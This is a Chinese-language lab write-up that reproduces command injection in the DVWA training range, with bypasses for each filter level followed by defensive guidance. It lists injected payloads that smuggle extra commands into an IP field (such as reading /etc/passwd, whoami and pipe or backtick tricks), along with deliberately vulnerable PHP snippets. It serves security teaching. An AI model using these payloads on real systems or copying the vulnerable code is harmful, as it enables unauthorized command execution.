# 命令注入（Command Injection）漏洞复现

> 漏洞模块：DVWA Command Injection
> 工具：浏览器、Burp Suite
> 难度等级：Low / Medium / High

> ⚠️ **合规声明**：本文档所有 Payload 均在本地 DVWA 靶场复现，仅用于安全学习。严禁对未授权系统使用。

---

## 一、漏洞概述

**原理**：Web 应用在执行系统命令（如 `ping`、`traceroute`、文件处理等）时，未对用户输入做充分过滤，攻击者可注入任意系统命令。

**OWASP 分类**：A03:2021 - Injection（命令注入是注入漏洞的子类）

**危害**：
- 直接执行任意系统命令
- 获取服务器权限
- 内网横向移动
- 持久化后门（植入 Webshell、计划任务等）

**典型场景**：
- 网络诊断工具（ping、nslookup、tracert）
- 文件预览（Office 转 PDF、图片处理调用 ImageMagick）
- 系统监控工具（top、ps）

---

## 二、DVWA 四等级复现

### 2.1 Low 级别

#### 代码分析
`vulnerabilities/exec/source/low.php`：
```php
$target = $_REQUEST['ip'];
$cmd = shell_exec('ping -c 4 ' . $target);
```

直接拼接用户输入到 `ping` 命令。

#### 复现步骤

1. 难度调至 **Low**，进入 **Command Injection** 模块
2. 输入框输入目标 IP：正常输入 `127.0.0.1` → 显示 ping 结果
3. **命令注入测试**：
   ```
   127.0.0.1; ls
   ```
4. 页面同时返回 ping 结果与 `ls` 命令输出 → **漏洞确认存在**

#### 常用 Payload（仅用于本地验证）

**Unix/Linux 系统（DVWA 通常部署在 Linux）**：

| 目的 | Payload 示例 |
|---|---|
| 列出当前目录 | `127.0.0.1; ls` |
| 查看当前用户 | `127.0.0.1; whoami` |
| 查看系统信息 | `127.0.0.1; uname -a` |
| 读取文件 | `127.0.0.1; cat /etc/passwd` |
| 使用 && 连接 | `127.0.0.1 && ls`（前一条成功才执行后一条） |
| 使用 \|\| 连接 | `127.0.0.1 \|\| ls`（前一条失败才执行后一条） |
| 使用管道 \| | `127.0.0.1 \| ls`（将前一条输出作为后一条输入） |
| 使用换行符 | `127.0.0.1%0als`（URL 编码换行） |
| 使用反引号 | `` 127.0.0.1`ls` `` （反引号内命令先执行） |
| 使用 $() | `127.0.0.1$(ls)` |

> ⚠️ 以上 Payload **仅限 DVWA 靶场**，严禁对未授权系统使用。

### 2.2 Medium 级别

#### 防护机制
```php
// 黑名单过滤（不推荐，仅做演示）
$substitutions = array('&&' => '', ';'  => '');
$target = str_replace(array_keys($substitutions), $substitutions, $_REQUEST['ip']);
```

仅过滤 `&&` 和 `;`，**过滤列表不完整**。

#### 绕过思路

| 被过滤符号 | 可替代符号 |
|---|---|
| `&&` | `&`（单个 & 不被过滤） |
| `;` | `|`（管道符）或换行符 `\n` |

#### 复现步骤

1. 难度调至 **Medium**
2. 使用 Payload：`127.0.0.1 | whoami`（管道符不被过滤）
3. 页面返回 ping 结果 + whoami 输出 → **漏洞仍然存在**

---

### 2.3 High 级别

#### 防护机制
黑名单扩展，但仍有遗漏：
```php
$substitutions = array(
    '&'  => '',
    ';'  => '',
    '| ' => '',  // 注意 | 后有一个空格
    '-'  => '',
    '$'  => '',
    '('  => '',
    ')'  => '',
    '`'  => '',
    '||' => '',
);
$target = str_replace(array_keys($substitutions), $substitutions, $_REQUEST['ip']);
```

**关键漏洞**：`| `（管道符 + 空格）过滤不彻底，但 `|`（管道符无空格）可绕过。

#### 绕过 Payload

```
127.0.0.1|whoami
```

或使用其他技巧如 URL 编码（`%7c`）等。

### 2.4 Impossible 级别（安全实现）

```php
// 1. 严格 IP 校验
if (filter_var($target, FILTER_VALIDATE_IP)) {
    $cmd = shell_exec('ping -c 4 ' . $target);
} else {
    die('Invalid IP.');
}

// 2. 操作分隔符黑名单（防御性兜底）
// 实际无需，因为输入已严格限制为合法 IP
```

**安全设计要点**：
- ✅ **白名单输入校验**（最关键）：仅接受合法 IPv4/IPv6
- ✅ 避免拼接 shell 命令，优先调用 API
- ✅ 最小权限运行 Web 服务（避免命令执行权限过大）

## 三、命令注入防御核心思路

### 3.1 避免直接调用 Shell（最安全）

| 场景 | 不安全做法 | 安全做法 |
|---|---|---|
| Ping | `shell_exec('ping ' . $ip)` | 调用 `ping` 程序但传入数组参数（PHP escapeshellarg） |
| 文件处理 | `exec('convert ' . $file)` | 使用对应库的 API（如 ImageMagick PHP 扩展） |
| DNS 查询 | `exec('nslookup ' . $domain)` | 使用 `dns_get_record()` PHP 函数 |

### 3.2 输入白名单（次优）

对于必须接受字符串输入的场景：
- IP 地址：`filter_var($input, FILTER_VALIDATE_IP)`
- 域名：`preg_match('/^[a-z0-9.-]+$/', $input)`
- 文件路径：限制在固定目录，且使用 `realpath()` 校验

### 3.3 参数转义（兜底）

PHP 提供的转义函数：
```php
$safe_arg = escapeshellarg($user_input);
$cmd = "ping -c 4 " . $safe_arg;
```

`escapeshellarg()` 会将参数用单引号包裹并转义内部单引号，**防止 shell 解析为多条命令**。

### 3.4 服务层加固

1. **Web 服务最小权限**：以 `www-data` 等低权限用户运行，避免 `root`
2. **容器化隔离**：使用 Docker 容器运行 Web 服务，限制文件系统、网络访问
3. **禁用危险命令**：`rm -rf`、`mkfs`、`dd` 等
4. **seccomp / AppArmor / SELinux**：限制进程可执行的系统调用

## 四、常见易受攻击场景

### 4.1 网络诊断工具
```php
// 危险示例
$ip = $_GET['ip'];
echo shell_exec("ping -c 4 $ip");
```

### 4.2 Office 转 PDF
```php
// 危险示例
$file = $_GET['file'];
shell_exec("libreoffice --headless --convert-to pdf $file");
```

### 4.3 图片处理
```php
// 危险示例（ImageMagick 历史漏洞）
shell_exec("convert $uploaded_file -resize 50% output.jpg");
```

### 4.4 日志查看
```php
// 危险示例
$log_file = $_GET['log'];
echo shell_exec("tail -n 100 $log_file");
```

## 五、加固清单

完成加固后，可通过以下方式验证：

- [ ] 输入 `127.0.0.1; ls` → 仅返回 ping 结果，无 ls 输出
- [ ] 输入 `127.0.0.1 | whoami` → 同上
- [ ] 输入 `127.0.0.1 && cat /etc/passwd` → 同上
- [ ] 输入非法 IP 如 `abc` → 提示「Invalid IP」
- [ ] 正常输入合法 IP → 功能正常
- [ ] Web 服务以低权限用户运行（`ps aux | grep apache`）
- [ ] 上传目录不可执行（即使上传 .php 也无法执行）
